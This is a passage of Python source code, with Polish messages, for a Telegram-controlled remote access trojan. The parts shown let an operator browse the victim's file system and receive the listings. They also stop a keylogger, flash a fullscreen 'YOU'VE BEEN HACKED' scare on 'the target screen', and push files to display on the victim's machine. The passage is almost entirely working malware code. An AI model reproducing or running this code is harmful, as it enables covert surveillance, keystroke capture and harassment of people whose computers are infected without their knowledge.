                        items.append(f"📁 {item}/")
                for item in os.listdir(path):
                    item_path = os.path.join(path, item)
                    if os.path.isfile(item_path):
                        size = os.path.getsize(item_path)
                        if size < 1024:
                            size_str = f"{size} B"
                        elif size < 1024 * 1024:
                            size_str = f"{size//1024} KB"
                        elif size < 1024 * 1024 * 1024:
                            size_str = f"{size//(1024*1024)} MB"
                        else:
                            size_str = f"{size//(1024*1024*1024)} GB"
                        items.append(f"📄 {item} ({size_str})")
                items.sort()
                if len(items) > 50:
                    items = items[:50]
                    items.append("... (wyświetlono tylko 50 pierwszych elementów)")
                if items:
                    response = f"Zawartość katalogu: {path}\n" + "\n".join(items)
                    if len(response) > 4096:
                        response = response[:4090] + "\n..."
                    await update.message.reply_text(response)
                else:
                    await update.message.reply_text(f"Katalog jest pusty: {path}")
                return
        except Exception as e:
            await update.message.reply_text(f"Błąd przeglądania: {str(e)}")

    async def stop_bot(self, update: Update, context: CallbackContext):
        if self.is_admin(update):
            self.keylogger_active = False
            keyboard.unhook_all()
            await update.message.reply_text("Zatrzymuję bota i wszystkie aktywności...")
            os._exit(0)
        else:
            await update.message.reply_text("Nie masz uprawnień!")

    def is_admin(self, update: Update):
        return update.message.from_user.id == ADMIN_ID

    async def jumpscare(self, update: Update, context: CallbackContext):
        if not self.is_admin(update):
            return
        duration = 3
        if context.args and len(context.args) > 0:
            try:
                duration = int(context.args[0])
            except ValueError:
                pass
        def show_jumpscare():
            root = tk.Tk()
            root.title("!!!")
            root.attributes('-fullscreen', True)
            root.configure(bg='black')
            scary_label = tk.Label(
                root,
                text="!!! YOU'VE BEEN HACKED !!!\n😱💀👻",
                font=("Arial", 48, "bold"),
                fg="red",
                bg="black"
            )
            scary_label.pack(expand=True)
            countdown_label = tk.Label(
                root,
                text=str(duration),
                font=("Arial", 72, "bold"),
                fg="white",
                bg="black"
            )
            countdown_label.pack()
            def countdown(remaining):
                if remaining <= 0:
                    root.destroy()
                else:
                    countdown_label.config(text=str(remaining))
                    root.after(1000, countdown, remaining-1)
            countdown(duration)
            root.attributes('-topmost', True)
            root.mainloop()
        threading.Thread(target=show_jumpscare, daemon=True).start()
        await update.message.reply_text(f"Jumpscare activated for {duration} seconds! Check the target screen.")

    async def show(self, update: Update, context: CallbackContext):
        if not self.is_admin(update):
            return
        if not context.args:
            await update.message.reply_text("Użycie: /show <nazwa_pliku>")
            return
        filename = context.args[0]
        local_file_path = self._find_local_file(filename)
        if not local_file_path:
            local_file_path = await self._download_from_telegram(update, filename)
        if not local_file_path:
            await update.message.reply_text(f"Nie znaleziono pliku: {filename}")
            return
        _, ext = os.path.splitext(local_file_path)
        ext = ext.lower()
        def display_file():
            root = tk.Tk()
            root.title(os.path.basename(local_file_path))
            root.attributes('-fullscreen', True)
            screen_width = root.winfo_screenwidth()
            screen_height = root.winfo_screenheight()
            if ext in ['.png', '.jpg', '.jpeg', '.gif', '.bmp', '.tiff']:
                try:
                    from PIL import Image, ImageTk
                    image = Image.open(local_file_path)
                    image.thumbnail((screen_width, screen_height), Image.LANCZOS)
                    photo = ImageTk.PhotoImage(image)
                    label = tk.Label(root, image=photo)
                    label.pack(expand=True)
                    label.image = photo
                except ImportError:
                    photo = tk.PhotoImage(file=local_file_path)
                    label = tk.Label(root, image=photo)
                    label.pack(expand=True)
                    label.image = photo
                except Exception as e:
                    error_label = tk.Label(root, text=f"Błąd ładowania obrazu: {str(e)}\n{local_file_path}", font=("Arial", 24), fg="white", bg="black")
                    error_label.pack(expand=True)
            else:
                error_label = tk.Label(root, text=f"Nieobsługiwany typ pliku: {ext}\nObsługiwane typy: .png, .jpg, .jpeg, .gif, .bmp, .tiff", font=("Arial", 24), fg="white", bg="black")
                error_label.pack(expand=True)
            close_button = tk.Button(root, text="Zamknij", command=root.destroy, font=("Arial", 18), bg="red", fg="white")
            close_button.pack(side='bottom', pady=20)
            root.attributes('-topmost', True)
            root.mainloop()
        threading.Thread(target=display_file, daemon=True).start()
        await update.message.reply_text(f"Wyświetlam plik: {os.path.basename(local_file_path)}")
        if local_file_path != filename and not os.path.exists(filename):
            try:
                os.remove(local_file_path)
            except:
                pass

    def _find_local_file(self, filename):
        if os.path.exists(filename):
            return filename
        common_paths = [
            filename,
            os.path.join(os.path.expanduser("~"), filename),
            os.path.join(os.path.expanduser("~"), "Desktop", filename),
            os.path.join(os.path.expanduser("~"), "Documents", filename),
            os.path.join(os.path.expanduser("~"), "Downloads", filename),
            os.path.join(os.path.dirname(os.path.abspath(__file__)), filename)
        ]
        for path in common_paths:
            if os.path.exists(path):
                return path
        return None

    async def handle_telegram_file(self, update: Update, context: CallbackContext):
        try:
            document = update.message.document
            if not document:
                return
            file_name = document.file_name
            file_id = document.file_id
            self.telegram_files[file_name] = {
                'file_id': file_id,
                'file_unique_id': document.file_unique_id,
                'file_size': document.file_size,
                'timestamp': datetime.now()
            }
            await update.message.reply_text(
                f"Plik '{file_name}' został zapisany w pamięci bota.\n"
                "Możesz go później wyświetlić używając komendy:\n"
                f"/show {file_name}"
            )
        except Exception as e:
            print(f"Błąd obsługi pliku Telegram: {e}")
            await update.message.reply_text("Błąd podczas zapisywania informacji o pliku.")

    async def _download_from_telegram(self, update: Update, filename):
        try:
            await update.message.reply_text(f"Szukam pliku '{filename}' w wiadomościach Telegram...")
            if filename not in self.telegram_files:
                found = False
                for stored_filename in self.telegram_files:
                    if filename.lower() in stored_filename.lower() or stored_filename.lower() in filename.lower():
                        filename = stored_filename
                        found = True
                        break
                if not found:
                    await update.message.reply_text(f"Nie znaleziono pliku '{filename}' w wiadomościach Telegram.")
                    return None
            file_info = self.telegram_files[filename]
            file_id = file_info['file_id']
            file = await self.bot_instance.get_file(file_id)
            temp_file_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), f"temp_{filename}")
            await file.download_to_drive(temp_file_path)
            await update.message.reply_text(f"Pobrano plik '{filename}' z Telegrama.")
            return temp_file_path
        except Exception as e:
            print(f"Błąd pobierania z Telegrama: {e}")
            await update.message.reply_text(f"Błąd podczas pobierania pliku z Telegrama: {str(e)}")
            return None

def main():
    if not os.path.exists("scripts"):
        os.makedirs("scripts")
    bot = RemoteControlBot()
    bot.setup_application()

if __name__ == "__main__":
    main()